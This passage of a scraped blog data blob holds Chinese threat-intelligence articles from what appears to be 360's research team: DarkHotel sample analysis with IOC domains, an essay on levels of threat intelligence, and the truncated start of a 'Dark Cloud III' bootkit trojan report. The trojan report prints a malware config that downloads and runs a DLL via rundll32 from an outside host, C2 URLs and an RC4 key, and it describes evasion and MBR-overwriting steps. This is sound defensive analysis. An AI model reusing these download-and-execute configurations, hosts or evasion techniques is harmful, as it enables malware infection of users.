data-line="97">目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/9d0ea33a223c2fdebd03a895edf31ceb.png" alt="" width="90%"></p>\n<p class="line" data-line="101">分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：</p>\n<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/74fcf6804bd22443ceb47358fc021ec2.png" alt="" width="90%"></p>\n<p class="line" data-line="105">样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：</p>\n<p class="text-center line" data-line="107"><img src="/uploads/2017/07/25/868677a706a24e956502810888c868cc.png" alt="" width="90%"></p>\n<p class="line" data-line="109">sub_497036是字符串的解密函数：</p>\n<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/c8f76a42d257ba8817e8b80416c2f570.png" alt=""></p>\n<p class="line" data-line="113">样本会检测虚拟机、沙箱和杀软：</p>\n<p class="line" data-line="115">卡巴</p>\n<p class="text-center line" data-line="117"><img src="/uploads/2017/07/25/6b5c4521e39cf81dc97b2e2a9db91a55.png" alt="" width="90%"></p>\n<p class="line" data-line="119">沙箱检测：</p>\n<p class="text-center line" data-line="121"><img src="/uploads/2017/07/25/fff4437f85266db166109fd32f6b86cc.png" alt=""></p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/d2b88af9186a3f06f23b0318416a98bc.png" alt=""></p>\n<p class="line" data-line="125">检测360的产品:</p>\n<p class="text-center line" data-line="127"><img src="/uploads/2017/07/25/600f0fbdf110cdd3b07a651bcfbb6c8e.png" alt="" width="90%"></p>\n<p class="line" data-line="129">检测金山和baidu的安全产品：</p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/25/b16792e0261b9c2d3068a6e226d8b3ff.png" alt="" width="90%"></p>\n<p class="line" data-line="133">检测通过后，会连接C&amp;C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：</p>\n<p class="text-center line" data-line="135"><img src="/uploads/2017/07/25/7515b38914cd0b2fe7495d5089164ac1.png" alt="" width="90%"></p>\n<p class="line" data-line="137">C&amp;C域名为：view-drama-online.com</p>\n<h2 class="line" data-line="139">相关分析</h2>\n<p class="line" data-line="141">使用高级账号查询360威胁情报中心，样本涉及的域名 all-microsoft-control.com 其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：</p>\n<p class="text-center line" data-line="143"><img src="/uploads/2017/07/25/d103771b3712fc6fae4ab8e6f460bdcb.png" alt=""></p>\n<p class="line" data-line="145">域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。</p>\n<p class="line" data-line="147">虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/4d53ddecf1f93575b5c6b4ac64455edf.png" alt="" width="90%"></p>\n<p class="line" data-line="151">事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。</p>\n<h2 class="line" data-line="153">关联组织</h2>\n<p class="line" data-line="155">360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。</p>\n<p class="line" data-line="157">该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。</p>\n<p class="line" data-line="159">我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。</p>\n<h2 class="line" data-line="161">IOC</h2>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>类型</strong></td>\n<td><strong>值</strong></td>\n</tr>\n<tr>\n<td><em>Downloader Domain</em></td>\n<td>all-microsoft-control.com</td>\n</tr>\n<tr>\n<td><em>C&amp;C Domain</em></td>\n<td>view-drama-online.com</td>\n</tr>\n</tbody>\n</table>\n</center>\n',category:"专题报告",__v:1,abstract:"360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。",modify_time:"2017-07-26T12:02:01.692Z",readableId:"darkhotel-targeted-attack-sample-analysis",publish_time:"2016-05-13T19:25:41.000Z",insert_time:"2017-07-25T12:03:51.362Z",isDraft:!1,tags:["DarkHotel","APT"]},{_id:"597733a71c670a09e493ee38",title:"威胁情报的层次分析",author:"admin",content:'<h2 class="line" data-line="0">威胁情报的层次分析</h2>\n<p class="line" data-line="2">威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。</p>\n<h3 class="line" data-line="4">威胁情报的概念</h3>\n<p class="line" data-line="6">目前，Gartner对于威胁情报的定义比较广地被引用：</p>\n<p class="line" data-line="8">“Threat intelligence is evidence-based knowledge, including context, mechanisms, indicators, implications and actionable advice, about an existing or emerging menace or hazard to assets that can be used to inform decisions regarding the subject\'s response to that menace or hazard.”</p>\n<p class="line" data-line="10">这是一个比较理想化的定义，对情报应该包含的信息量提出了明确的要求，面向高端用户提供决策依据的完整情报样式，可以认为是狭义的威胁情报。</p>\n<p class="line" data-line="12">事实上，对于大多数的组织机构得不到上述这类准确和全面的情报服务，即便得到也无法采取应对措施。想象一下，即使有安全厂商能够告诉某个大公司一个安全威胁的背后的组织、国家背景甚至人员信息（这些都是高端威胁情报的必要组成部分），那又能如何？通常的组织机构不是执法机构，无法对这些情报采取什么缓解威胁的措施。</p>\n<p class="line" data-line="14">对一般的公司组织相对低端的入侵指示器（Indicator Of Compromise，IOC）可能更为实际些，它由可被边界安全设备和主机安全防护软件所使用的数据所构成，典型的入侵指示器有文件HASH、IP、域名、程序运行路径、注册表项等，这类威胁情报在下文有详细的分析。</p>\n<h3 class="line" data-line="16">威胁情报的作用</h3>\n<p class="line" data-line="18">通过对威胁情报的交换和共享，联合安全业界各方的力量，整合信息资源实现更大范围内的快速响应，以对抗也在不停进化的安全威胁。以下Webroot小纪念品上的图非常形象地表现了威胁情报所能起到的作用。</p>\n<p class="text-center line" data-line="20"><img src="/uploads/2017/07/25/869d3df44a6f8ecd3f9a9a262fb10259.png" alt=""></p>\n<p class="line" data-line="22">目前威胁情报作为一个安全关键词显得非常火热，但是显然被有些寄予了过高的期望，在安全领域不存在什么单点的银弹技术。准确及时的入侵指示数据可以帮助用户快速处理已经或正在发生的威胁，比如黑样本的HASH、对外连接的CC及Downloader服务器的IP或域名，网络边界设备或运行于主机上的Agent可以通过简单的匹配就能发现并采用自动化的应对措施。当用户试图分析一个可疑事件时，威胁情报可以为用户判定可疑事件的恶意性提供有用的参考资料，比如事件所涉及到的IP是否在某些已知的黑名单之中，相关的域名是否被已知的APT活动使用等。</p>\n<h3 class="line" data-line="24">威胁情报的层次</h3>\n<p class="text-center line" data-line="26"><img src="/uploads/2017/07/25/bc5008dcf0f163de8a317d8befd5eded.png" alt="" width="45%"></p>\n<p class="line" data-line="28">上图是我们构建的一个展示威胁情报层次的金字塔图，我们从下到上逐层解释一下每个层次的信息构成，所能发挥的作用及分析获取的方法。</p>\n<h4 class="line" data-line="30">文件HASH</h4>\n<p class="line" data-line="32">最底层威胁情报由文件构成，主要涉及恶意网络活动相关的各种恶意代码：Trojan、Backdoor、Downloader、Dropper等。一般来说，文件样本是整个事件分析的起点和基础性数据，其重要性相当于刑事案件调查中最主要的物证，比如凶器和尸体。用于标记文件的各种HASH是最基本威胁情报信息，可以方便地用于在目标系统上进行搜索，如果一个木马文件在系统上被发现则对象被感染的可能性就非常大。下图是Symantec发布的Butterfly攻击活动相关的部分文件HASH列表。</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/25/797ed870122992cd8f261a4ff69eb6c9.png" alt="" width="90%"></p>\n<p class="line" data-line="36">绝大多数文件HASH的主要问题在于特异性太强，无论是MD5、SHA1、SHA256，只要文件出现一个比特位的变化就会导致完全不同的HASH值，这个特性在避免误报的同时也使攻击者可以通过最简单的内容修改来躲过检测，所以一旦被公开揭露，几乎立即过期。因此，文件HASH作为入侵指示器基本只能用来发现已发生的事件，对防御方来说需要用自动化的搜索匹配机制尽可能用其来缩短从事件发生到发现时间窗口，以尽可能减少损失。</p>\n<h4 class="line" data-line="38">主机和网络特征</h4>\n<p class="line" data-line="40">在文件HASH之上的是通过分析文件样本得到的直接关联的各类基于主机和网络特征，这些数据可以被用来作为入侵指示器。简单来说，主机特征可能包含恶意代码在机器上运行时产生的有区分能力的数据，比如程序运行时的Mutex、写入的注册表项、文件路径等，网络特征可能包含对外连接的C&amp;C或组件下载的IP/域名、访问的URL、通信协议等信息。下图是一个木马内置的主机与网络特征数据的例子。</p>\n<p class="text-center line" data-line="42"><img src="/uploads/2017/07/25/0952d915d9506860b3a4f8784debdacd.png" alt="" width="90%"></p>\n<p class="line" data-line="44">这些数据大多可以通过使样本运行于受控环境（沙箱和虚拟机）来获取，对于对抗强度较高的或无法运行的样本手工的逆向调试分析则有可能是必须的，这时就需要很大的时间与精力投入。相较于文件HASH，这些从文件中通过静态或动态分析得到的特征相对稳定，但改变的代价依然很小，特别是在被公开揭露出来以后，作为入侵指示器的价值也会很快消失。</p>\n<h4 class="line" data-line="46">事件层次情报</h4>\n<p class="line" data-line="48">在单个样本相关的信息以上为事件层次的威胁情报。当我们得到了大量文件样本相关的细节以后，通过分析其各个维度上的相似度就可以实现样本家族的分类。下图是三个疑似欧洲来源的秘密监控软件基于样本特征的同源性分析，可以看到一些关键特征保持一致，暗示它们有共同的源头。</p>\n<p class="text-center line" data-line="50"><img src="/uploads/2017/07/25/fd9f10aa52b4ba6c312ceb500b0cd377.png" alt="" width="90%"></p>\n<p class="line" data-line="52">通过分析样本之间的上下游关系，可以推断攻击发生时恶意代码的进入渠道，从而了解对手的攻击手法，通过鱼叉邮件、水坑攻击、U盘植入还是其他主动性的攻击，是否利用了安全漏洞，使用了什么样的社工技巧。了解攻击的方法对于防御方调整防护方案，填补漏洞和盲点，使防护更有针对性同时降低成本有重要的意义。下图是2015年360公司揭露的海莲花APT事件中攻击者所使用的恶意代码感染方式。</p>\n<p class="text-center line" data-line="54"><img src="/uploads/2017/07/25/9327cd893ec3f6e366e17d5e7448a629.png" alt="" width="90%"></p>\n<p class="line" data-line="56">如果收集到的数据包含受害者内部网络和主机的行为，我们还能了解攻击者在受害者内部系统中尝试进一步获取控制的方式和方法。因此，要得到的准确的事件层次的威胁情报，需要更多的数据输入，更多的分析资源投入，所以其得到的结果也包含了更大信息量。</p>\n<p class="line" data-line="58">以下我们整理了基于Lockheed Martin Kill Chain模型各环节中可用于做关联性分析的维度。</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>侦察跟踪</strong></th>\n<th><strong>武器构建</strong></th>\n<th><strong>载荷投递</strong></th>\n<th><strong>突防利用</strong></th>\n<th><strong>安装植入</strong></th>\n<th><strong>通信控制</strong></th>\n<th><strong>达成目标</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目标国家</td>\n<td>特定互斥量</td>\n<td>恶意代码进入方式</td>\n<td>漏洞利用</td>\n<td>初始启动路径</td>\n<td>域名注册信息</td>\n<td>目标数据</td>\n</tr>\n<tr>\n<td>目标个体</td>\n<td>执行流程</td>\n<td>鱼叉邮件</td>\n<td>社会工程学</td>\n<td>持续启动方式</td>\n<td>域名使用偏好</td>\n<td>打包方法</td>\n</tr>\n<tr>\n<td>涉及行业</td>\n<td>加解密方式</td>\n<td>水坑攻击</td>\n<td></td>\n<td>伪装正常模式</td>\n<td>域名命名偏好</td>\n<td>传输方法</td>\n</tr>\n<tr>\n<td></td>\n<td>特定功能模块</td>\n<td>U盘</td>\n<td></td>\n<td></td>\n<td>IP所在ASN</td>\n<td>破坏功能</td>\n</tr>\n<tr>\n<td></td>\n<td>对抗分析措施</td>\n<td>主动渗透</td>\n<td></td>\n<td></td>\n<td>后门工具</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>源码工程路径</td>\n<td></td>\n<td></td>\n<td></td>\n<td>工具类型</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特定数据字串</td>\n<td></td>\n<td></td>\n<td></td>\n<td>工具配置</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>语言编译环境</td>\n<td></td>\n<td></td>\n<td></td>\n<td>通信协议</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特定数字签名</td>\n<td></td>\n<td></td>\n<td></td>\n<td>认证凭据</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>组件组织架构</td>\n<td></td>\n<td></td>\n<td></td>\n<td>SSL证书</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特别的错误</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="76">来自Lockheed Martin的一个实际的多个攻击事件基于要素关联的例子：</p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/46d475b0987decceed25d533d23f4a6b.png" alt=""></p>\n<h4 class="line" data-line="80">组织情报</h4>\n<p class="line" data-line="82">基于事件层次的事实收集与分析，我们可能可以分辨出多个攻击事件背后的同一个组织，并判定组织的来源、分工、资源状况、人员构成、行动目标等要素。</p>\n<p class="line" data-line="84">通过分析对手所使用工具开发维护状况、突破技术及通信基础设施，可以推断对手的资源状况。一般来说，使用自己开发的成系列的漏洞利用及控制工具，通信网络使用了较多的IP、域名及服务器资源，载荷投递时显示出专业的针对性技巧，则可以判断对手拥有较强的能力，有足够的资源支持，组织内部可能存在明确的分工。</p>\n<p class="line" data-line="86">组织的来源可以通过分析事件涉及的样本文件中包含的语言相关的特征来推断，比如字符串的语言、开发或打包工具的语言版本，对于非可执行的样本，也可以分析其默认的配置情况。在占有大量样本的情况下，可以通过分析样本的生成时间推断对手的日常工作时间，甚至休假情况，与特定国家的节假日做匹配，也可能成为分析对手来源的有效线索。如果有资源了解受影响目标的国家、行业及个体的分布，以及对手所发动的攻击类型（窃密型还是求财型）所使用的基础设施的地理位置，我们也可以非常有把握地推测出对手的来源。</p>\n<p class="line" data-line="88">以下是Cylance一个名为Operation Cleaver的APT活动的来源要点分析：</p>\n<p class="text-center line" data-line="90"><img src="/uploads/2017/07/25/cd97a55e18a34675df8f37d50c89f233.png" alt="" width="90%"> {</p>\n<h4 class="line" data-line="92">人员情报</h4>\n<p class="line" data-line="94">在组织之上的是人员相关的威胁情报，这是威胁分析的最后一环，实现虚拟身份到现实身份的映射。</p>\n<p class="line" data-line="96">人处在威胁情报金字塔的顶端，因为它是整个威胁体系中最稳定的部分，一旦定位到人也就定位到了威胁产生的根源，解决人的问题是真正釜底抽薪的解决方案。弗诺·文奇写过一篇非常精彩的小说，名字就叫《真名实姓》，未来虚拟空间里最大的问题就是如何把其中的角色对应到现实中的人，一旦完成映射就意味着战斗的结束。这是因为如果我们处理的对象是人，就意味着解决问题的手段不会再受限于技术可能性。所有处于人之下的威胁情报类型我们一般只能采取技术手段来处理，比如我们知道一些攻击相关的IOC（样本、IP或域名），对其有效的处置手段主要局限于人工或自动化的识别、隔离及阻断等。而当我们对抗对象是人时，那么可采用的手段就可以丰富得多，我们不仅可以对目标本身还可以对其所在环境施加压力，利用人性的弱点就能实现类似降维攻击的效果。</p>\n<p class="line" data-line="98">要得到这类情报，信息的输入也就不再限于技术分析，可能需要其他方面的数据输入及非常规的取证手段，比如真实注册信息、社交账号的关联数据、交易数据、蜜罐及反制。下图是360公司使用交互式数据关联系统对XcodeGhost事件的始作俑者的追溯演示，从攻击者所使用的一个C&amp;C域名（做了隐私保护）出发通过层层前推最终定位到一个关联域名，而攻击者用其真实名字注册的它。</p>\n<p class="text-center line" data-line="100"><img src="/uploads/2017/07/25/3145339917e5bd870cb7285522b4a5ba.png" alt="D:\\work\\skyeye\\产品截图\\xcode.JPG" width="90%"> {</p>\n<h3 class="line" data-line="103"><strong>参考链接</strong></h3>\n<p class="line" data-line="105"><a href="https://malwareconfig.com/">Malwareconfig</a></p>\n<p class="line" data-line="107"><a href="https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/butterfly-corporate-spies-out-for-financial-gain.pdf">Butterfly: Corporate spies out for fiancial gain</a></p>\n<p class="line" data-line="109"><a href="https://www.blackhat.com/docs/us-15/materials/us-15-MarquisBoire-Big-Game-Hunting-The-Peculiarities-Of-Nation-State-Malware-Research.pdf">BIG GAME HUNTING: THE PECULIARITIES OF NATION-STATE MALWARE RESEARCH</a></p>\n<p class="line" data-line="111"><a href="https://ti.360.com/upload/report/file/OceanLotusReport.pdf">OceanLotus (APT-C-00)数字海洋的游猎者</a></p>\n<p class="line" data-line="113"><a href="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains</a></p>\n<p class="line" data-line="115"><a href="https://cdn2.hubspot.net/hubfs/270968/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf">Operation Cleaver</a></p>\n',category:"安全观点",__v:0,abstract:"威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。",modify_time:"2017-08-07T07:16:59.174Z",publish_time:"2016-04-22T17:32:44.000Z",readableId:"level-of-threat-intelligence",descImg:"/uploads/2017/08/01/0e275715b71ac1ebf7c79054513124a2.png",insert_time:"2017-07-25T12:03:51.286Z",isDraft:!1,tags:[]}],pageTotal:2}]}],error:null,state:{pageId:[],tagParam:[],isMainPage:!0,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee3f",title:"暗云III木马技术分析报告",author:"admin",content:'<h1 class="line" data-line="0">事件背景</h1>\n<p class="line" data-line="2">2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<p class="line" data-line="6">360威胁情报中心得到了如下木马相关的样本，相关的基本信息如下：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<h2 class="line" data-line="23">样本分析</h2>\n<h3 class="line" data-line="25">安装程序分析</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="37">样本功能：</p>\n<p class="line" data-line="39">样本运行后显示正常游戏界面，会在后台解密payload，并在内存中动态到payload入口点执行，payload会搜集本机信息，拼接本机信息做为配置文件的下载地址，使用URLDownloadToFile下载配置文件，解析配置文件中的url字段、cmdline等字段，下载url字段中的内容并在内存中加载执行。</p>\n<p class="line" data-line="41">样本运行，显示正常游戏界面：</p>\n<p class="text-center line" data-line="43"><img src="/uploads/2017/07/25/8d3855a37f8ffd02687f20f6453d09d2.png" alt="" width="90%"></p>\n<p class="line" data-line="45">使用CallWindowProcW注册窗口事件：</p>\n<p class="text-center line" data-line="47"><img src="/uploads/2017/07/25/82fb7aa498073b3e2954ccae8cd970be.png" alt="" width="90%"></p>\n<p class="line" data-line="49">在窗口处理函数中，查找89号资源，加载该图片资源，在该图片资源图片偏移ED7C的位置，保存着可以执行的代码：</p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/5f9634e9176ef02f8ea69cb1b2350fd7.png" alt="" width="90%"></p>\n<p class="line" data-line="53">将图片偏移ED7C处的代码复制到新申请的内存中。</p>\n<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/741f41debd244b71db0a22d1a5f4c6a2.png" alt="" width="90%"></p>\n<p class="line" data-line="57">这段代码包含两部分内容：</p>\n<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/3e31f618818bf21ed704b04d4d8a4049.png" alt="" width="90%"></p>\n<p class="line" data-line="61">运行这段代码时，首先会运行前面部分的shellcode内容，shellcode会使用RtlDecompressBuffer函数在内存中解压被压缩过的PE文件：</p>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/e7ea049d373a454193a95dad49ea0d20.png" alt="" width="90%"></p>\n<p class="line" data-line="65">对解压缩出的PE文件进行内存动态加载后到入口点执行：</p>\n<p class="text-center line" data-line="67"><img src="/uploads/2017/07/25/bd602bc9d44b44c728009b668ac44b87.png" alt="" width="90%"></p>\n<p class="line" data-line="69">这个内存解密出来的样本的功能为：</p>\n<p class="line" data-line="71">检测本机的环境（包括是否安装有360安全软件，是否是网吧环境，是否是虚拟机环境等），将收集到的客户端信息发送到http://c2tongji.b5156.com:89，服务器根据对本机环境做出判断返回不同内容。只有在满足特定环境的情况下，才会返回带有恶意下载链接的配置文件。而在木马的运行环境不符合木马作者的预期时，则不会返回恶意配置文件，以此来逃避安全软件查杀。</p>\n<p class="line" data-line="73">检测虚拟机的代码片段：</p>\n<p class="text-center line" data-line="75"><img src="/uploads/2017/07/25/54973d048e7febe6b07039866cae4eea.png" alt="" width="90%"></p>\n<p class="line" data-line="77">检测360安全软件的代码片段：</p>\n<p class="text-center line" data-line="79"><img src="/uploads/2017/07/25/e291e320f4497ac980561387b51413da.png" alt="" width="90%"></p>\n<p class="line" data-line="81">检测是否是网吧环境的代码片段：</p>\n<p class="text-center line" data-line="83"><img src="/uploads/2017/07/25/2c5253cef83ef09e1bc914411790624b.png" alt="" width="90%"></p>\n<p class="line" data-line="85">搜集用户信息，通过URLDownloadToFile下载配置文件到本地：</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/25/7187ef685aaa1b25f1cce49994fa6c70.png" alt="" width="90%"></p>\n<p class="line" data-line="89">下载回来的配置文件的格式为：</p>\n<pre class="hljs"><code class="hljs">[Update] \n\nVersion=2 \nUrl=http://update.njmmy.com:8089/config/LDrvSvc.zip \nCmdLine=rundll32.exe LDrvSvc.dll,RundllInstall \nDir=%appdata%\\\\LDrvSvc\n</code></pre>\n<p class="line" data-line="100">随后对下载回来的配置文件进行解析后，使用CreateProcess加载从配置文件中URL字段的内容：</p>\n<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/3a276293536a6aae76052c69bd5e0009.png" alt="" width="90%"></p>\n<p class="line" data-line="104">此时下载的内容经过解密后在内存中执行，会尝试改写MBR。</p>\n<h4 class="line" data-line="106">MBR的改写</h4>\n<p class="line" data-line="108">此阶段木马的主要功能为：从上面的配置中下载回来的zip包中包含了驱动人生的白样本，木马利用驱动人生的白样本文件会尝试加载名为DtlCrashCatch.dll文件，而此文件是攻击者所提供的恶意代码，这是典型的白加黑绕过杀软的技巧，被国内恶意代码开发者所广泛使用。DtlCrashCatch.dll文件会从http://www.2tf1.com/upcfg.db 得到URL,从那个URL指向位置下载加密过的内容，在本地内存中解密后加载执行尝试修改用户计算机硬盘的MBR。</p>\n<p class="line" data-line="110">被恶意利用的白签名文件：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>b3a4d017e51da2a3aef520d4836c6dc6</td>\n</tr>\n<tr>\n<td class="text-right"><strong>签名信息</strong></td>\n<td>Shenzhen DriveTheLife Software Technology Co.Ltd</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/1f3867e09ed33b793a5d289b29c97a5b.png" alt=""></p>\n<p class="line" data-line="121">具体的过程为：</p>\n<p class="line" data-line="123">通过调用“rundll32.exe LDrvSvc.dll,RundllInstall Dir=%appdata%\\LDrvSvc”命令，将调用LDrvSvc.dll的RundllInstall函数,在RundllInstall函数中调用了HostInstall函数。</p>\n<p class="text-center line" data-line="125"><img src="/uploads/2017/07/25/85b5ec0409f383567f0b1549b690dacb.png" alt=""></p>\n<p class="line" data-line="127">而HostInstall函数会将在系统中注册LDrvSvc服务。</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/25/3d6bec505975067b32d8763a840beb0c.png" alt="" width="99%"></p>\n<p class="line" data-line="131">随后以服务方式启动LDrvSvc.dll，这时会进入LDrvSvc.dll的ServiceMain函数。ServiceMain函数会加载DtlCrashCatch.dll文件</p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/25/298ad7bf8935ff4ead3d9db5c196f408.png" alt="" width="90%"></p>\n<p class="line" data-line="135">最终会调用DtlCrashCatch.dll的1001E889代码处：</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/25/e0518563c8f545b78b5f883786ca2eab.png" alt=""></p>\n<p class="line" data-line="139">上述代码功能为通过CreateFileMapping和MappingViewOfFile解密指定尾部数据到一个共享内存，解密到共享内存中的代码shellcode，功能为调用RtlDecompressBuffer解密出PE并到PE入口点处执行。</p>\n<p class="line" data-line="141">这个PE的功能为从http://www.2tf1.com/upcfg.db下载文件，将文件使用RC4算法解密，并判断下载回来的文件前4个字节是不是0xA5A5A5A5，如果满足条件则从解密后的第4个字节处开始执行。</p>\n<p class="line" data-line="143">此处使用的RC4密钥的十六进制表示为：</p>\n<blockquote>\n<p>F4 70 75 3D 21 B7 D8 95 BE 49 48 C1 56 F6 A9 C1</p>\n</blockquote>\n<p class="line" data-line="147">下载配置文件代码片段：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/c95671370be5e1961e9eeef2cfbf49cc.png" alt=""></p>\n<p class="line" data-line="151">RC4解密后，比较0xA5A5A5A5代码片段：</p>\n<p class="text-center line" data-line="153"><img src="/uploads/2017/07/25/2c2b82a1842430ea939c019fcae7d322.png" alt=""></p>\n<p class="line" data-line="155">从解密出的代码+4处开始执行后，又会执行与前面类似的解密过程，先通过RtlDecompressBuffer解压缩代码后面部分压缩过的PE文件数据，随后动态加载PE后，到PE入口点执行。</p>\n<p class="line" data-line="157">这时解压缩的代码片段：</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/25/ff178268784de66dbfc2e790fe8f0aba.png" alt="" width="90%"></p>\n<p class="line" data-line="161">内存加载PE代码片段：</p>\n<p class="text-center line" data-line="163"><img src="/uploads/2017/07/25/89ee096572aa2ca4e893c3ceccdafad7.png" alt="" width="90%"></p>\n<p class="line" data-line="165">内存中加载的这个PE文件才是最终真正的修改MBR的PE。</p>\n<p class="line" 